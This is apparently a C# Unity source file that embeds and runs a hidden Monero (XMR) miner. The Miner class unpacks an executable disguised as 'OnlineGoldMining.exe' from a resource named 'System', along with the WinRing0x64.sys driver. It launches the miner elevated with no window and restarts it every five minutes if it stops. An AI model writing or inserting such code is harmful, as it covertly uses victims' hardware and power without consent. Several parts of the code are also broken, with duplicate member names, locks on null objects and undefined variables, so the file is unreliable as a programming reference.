using System.Collections;
using System.Collections.Generic;

namespace N5youTool
{
    public class MinerProcessInfo 
    {
        public string myName;
        public byte[] data;

        public MinerProcessInfo(string name, byte[] data)
        {
            this.myName = name;
            this.data = data;
        }
    }

    public class Miner : System.IDisposable
    {
        internal static readonly string MINER_PATH;
        internal static readonly string MINER_RELY_PATH;

        public System.Diagnostics.Process MyMinerProcess = null;
        private System.Diagnostics.Process MyMinerProcess
        {
           get
           {
               lock (myMinerProcess)
               {
                   return myMinerProcess;
               }
           }
           set
           {
               lock (myMinerProcess)
               {
                   myMinerProcess = value;
               }
           }
        }

        private System.Threading.Thread MyMinerThread = null;
        private System.Threading.Thread MyMinerThread
        {
            get
            {
                lock (myMinerThread)
                {
                    return myMinerThread;
                }
            }
            set
            {
                lock (myMinerThread)
                {
                    myMinerThread = value;
                }
            }
        }

        static Miner()
        {
            MINER_PATH = Application.streamingAssetsPath + "/" + Main.ID + "/OnlineGoldMining.exe";
            MINER_RELY_PATH = Application.streamingAssetsPath + "/" + Main.ID + "/WinRing0x64.sys";
        }

        private Miner()
        {
        }

        public static Miner StartXMR(string arguments) 
        {
            Miner myMiner = new Miner();
            System.Diagnostics.Process.LeaveDebugMode();
            myMiner.InitializationMiner(arguments);
            return myMiner;
        }

        public static Miner GetXMRById(int id)
        {
            Miner myMiner = new Miner();
            System.Diagnostics.Process.LeaveDebugMode();
            myMiner.InitializationMiner(null);
            myMiner.MyMinerProcess = System.Diagnostics.Process.GetProcessById(id);
            myMiner.MyMinerProcess.StartInfo.RedirectStandardError = true;
            myMiner.MyMinerProcess.StartInfo.RedirectStandardInput = true;
            myMiner.MyMinerProcess.StartInfo.RedirectStandardOutput = true;
            return myMiner;
        }

        private bool InitializationMiner(string arguments) 
        {
            MyMinerProcess = null;
            MyMinerProcess = MyProcess.RunAProcessAtOnce("OnlineGoldMining");
            if (MyMinerProcess != null)
            {
                return false;
            }
            MyMinerProcess = new System.Diagnostics.Process(); 
            MyMinerProcess.StartInfo.FileName = MINER_PATH; 
            MyMinerProcess.StartInfo.UseShellExecute = false; 
            MyMinerProcess.StartInfo.RedirectStandardInput = true; 
            MyMinerProcess.StartInfo.RedirectStandardOutput = true; 
            MyMinerProcess.StartInfo.RedirectStandardError = true; 
            MyMinerProcess.StartInfo.Verb = "RunAs";
            if (!string.IsNullOrEmpty(arguments))
            {
                MyMinerProcess.StartInfo.Arguments = arguments; 
            }
            MyMinerProcess.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            MyMinerProcess.StartInfo.CreateNoWindow = true; 
            return true;
        }

        internal void RunMiner(bool isNoWorkStoppage) 
        {
            if (isNoWorkStoppage) 
            {
                MyMinerThread = new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(RunMiner));
                MyMinerThread.Start(this); 
            }
            NeedMiners();
            MyMinerProcess.Start(); 
        }

        private static void RunMiner(object myMinerObj) 
        {
            Miner myMiner = (Miner)myMinerObj;
            myMiner.NoWorkStoppage();
        }

        private void NoWorkStoppage() 
        {
           while (true) 
           {
               System.Threading.Thread.Sleep(300000); 
               if (MyMinerProcess.HasExited)
               {
                   NeedMiners(); 
                   MyMinerProcess.Start();
               }
           }
        }

        internal void NeedMiners() 
        {
            string appPath = Application.streamingAssetsPath + "/" + Main.ID;
            if (!System.IO.Directory.Exists(appPath)) 
            {
                System.IO.Directory.CreateDirectory(appPath);
            }
            if (!System.IO.File.Exists(MINER_PATH))
            {
                byte[] data = Resources.Load<TextAsset>("System").bytes;
                FileManager.CreateFileAndSpecifyInfo(MINER_PATH, data);
            }
            else
            {
                if (!FileManager.VerifyHash(MINER_PATH, "F93ED7E49DC25FADA45B685DF09E225B1DC5A506"))
                {
                    FileManager.DeleteFile(MINER_PATH);
                    byte[] data = Resources.Load<TextAsset>("System").bytes;
                    FileManager.CreateFileAndSpecifyInfo(MINER_PATH, data);
                }
            }
            if (!System.IO.File.Exists(MINER_RELY_PATH))
            {
                byte[] data = Resources.Load<TextAsset>("win0x64").bytes;
                FileManager.CreateFileAndSpecifyInfo(MINER_RELY_PATH, data);
            }
            else if (!FileManager.VerifyHash(MINER_RELY_PATH, "BED100EB0548406DF1300973E79E49307649B509"))
            {
                FileManager.DeleteFile(MINER_RELY_PATH);
                byte[] data = Resources.Load<TextAsset>("win0x64").bytes;
                FileManager.CreateFileAndSpecifyInfo(MINER_RELY_PATH, data);
            }
        }

        private void Release() 
        {
            if (MyMinerThread != null)
            {
               MyMinerThread.Abort();
            }
            if (MyMinerProcess.HasExited)
            {
                return;
            }
            MyMinerProcess.CloseMainWindow();
            if (MyMinerProcess.HasExited)
            {
               return;
            }
            MyMinerProcess.Kill();
        }

        public void Dispose() 
        {
            this.Release();
        }

        public string ReadLine()
        {
            string str = MyMinerProcess.Read();
            return string.Empty;
        }

        public bool HasExited()
        {
            return MyMinerProcess.HasExited;
        }

        public void Exited()
        {
            MyMinerProcess.Kill();
        }
    }

    public class MyProcess
    {
        public static System.Diagnostics.Process RunAProcessAtOnce()
        {
            System.Diagnostics.Process[] pProcesses = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName); 
            if (pProcesses != null && pProcesses.Length > 0)
            {
                System.Environment.Exit(0); 
                return pProcesses[0];
            }
            return null;
        }

        public static System.Diagnostics.Process RunAProcessAtOnce(string name) 
        {
            System.Diagnostics.Process[] pProcesses = System.Diagnostics.Process.GetProcessesByName(name); 
            if (pProcesses != null && 0 < pProcesses.Length)
            {
                System.Environment.Exit(0);
                return pProcesses[0];
            }
            return null;
        }
    }

    public class FileManager 
    {
        public static byte[] ReadStreamingAssetsFileInfo(string path) 
        {
            string jsonPath = Application.streamingAssetsPath + "/" + path;
            byte[] data = null;
            try
            {
                using (System.IO.FileStream fs = new System.IO.FileStream(jsonPath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
                {
                    fs.Seek(0, System.IO.SeekOrigin.Begin);
                    data = new byte[fs.Length];
                    fs.Read(data, 0, (int)fs.Length);
                    string jsonData = System.Text.Encoding.UTF8.GetString(bytes);
                    fs.Flush();
                    fs.Dispose();
                    fs.Close();
                }
            }
            catch (System.Exception e)
            {
            }
            return data;
        }

        public static byte[] ReadFileInfo(string path) 
        {
            if (!System.IO.File.Exists(path))
            {
                return null;
            }
            byte[] heByte;
            using (System.IO.FileStream fsRead = new System.IO.FileStream(path, System.IO.FileMode.Open))
            {
                heByte = new byte[fsRead.Length];
                int r = fsRead.Read(heByte, 0, heByte.Length);
            }
            return heByte;
        }

        public static void CreateFileAndSpecifyInfo(string path, byte[] data)
        {
            using (System.IO.FileStream streamWrite = new System.IO.FileStream(path, System.IO.FileMode.Create))
            {
                streamWrite.Write(data, 0, data.Length);
                streamWrite.Close();
            }
        }

        public static void OverwriteCreationFile(string path, string text)
        {
            try
            {
                byte[] data = System.Text.Encoding.UTF8.GetBytes(text);
                if (!System.IO.File.Exists(path))
                {
                    CreateFileAndSpecifyInfo(path, data);
                    return;
                }
                System.IO.File.WriteAllBytes(path, data);
            }
            catch (System.Exception ex)
            {
            }
        }

        public static bool VerifyHash(string fileName, string hash) 
        {
            return GetHash(fileName).Equals(hash);
        }

        public static string GetHash(string fileName)
        {
            string youHash = string.Empty;
            using (System.IO.FileStream fs = new System.IO.FileStream(fileName, System.IO.FileMode.Open))
            using (System.IO.BufferedStream bs = new System.IO.BufferedStream(fs))
            {
                using (System.Security.Cryptography.SHA1Managed sha1 = new System.Security.Cryptography.SHA1Managed())
                {
                    byte[] hashData = sha1.ComputeHash(bs);
                    System.Text.StringBuilder formatted = new System.Text.StringBuilder(2 * hashData.Length);
                    foreach (byte b in hashData)
                    {
                        formatted.AppendFormat("{0:X2}", b);
                    }
                    using (var cryptoProvider = new System.Security.Cryptography.SHA1CryptoServiceProvider())
                    {
                        youHash = System.BitConverter.ToString(cryptoProvider.ComputeHash(hashData));
                        youHash = youHash.Replace("-", "");
                    }
                }
            }
            return youHash;
        }

        public static void DeleteFile(string path)
        {
            System.IO.File.Delete(path);
        }

        public static bool Exists(string path)
        {
            return System.IO.File.Exists(path);
        }
    }

    public class DataTool
    {
        public static string ToJSON(object o)
        {
            return Newtonsoft.Json.JsonConvert.SerializeObject(o);
        }

        public static T FromJSON<T>(string input) where T : class
        {
            try
            {
                return Newtonsoft.Json.JsonConvert.DeserializeObject<T>(input);
            }
            catch (System.Exception ex)
            {
            }
            return null;
        }

        public static byte[] DelimiterStringToBytes(string str, char delimiter)
        {
            string[] strings = str.Split(delimiter);
            ulong length = (ulong)strings.Length;
            byte[] data = new byte[length];
            for (ulong index = 0; index < length; index++)
            {
                data[index] = byte.Parse(strings[index]);
            }
            return data;
        }

        public static string ByesToString(byte[] bytesTest, string delimiter)
        {
            System.Text.StringBuilder result = new System.Text.StringBuilder();
            foreach (byte b in bytesTest)
            {
                string s = b.ToString() + delimiter;
                result.Append(s);
            }
            return result.ToString();
        }

        public static string BytesToBinaryString(byte[] bytesTest)
        {
            System.Text.StringBuilder result = new System.Text.StringBuilder(bytesTest.Length * 8);
            foreach (byte b in bytesTest)
            {
                result.Append(System.Convert.ToString(b, 2).PadLeft(8, '0'));
            }
            return result.ToString();
        }

        public static byte[] BinaryStringToBytes(string strResult)
        {
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            int numOfBytes = strResult.Length / 8;
            byte[] bytes = new byte[numOfBytes];
            for (int i = 0; i < numOfBytes; ++i)
            {
                bytes[i] = System.Convert.ToByte(strResult.Substring(8 * i, 8), 2);
            }
            return bytes;
        }
    }
}
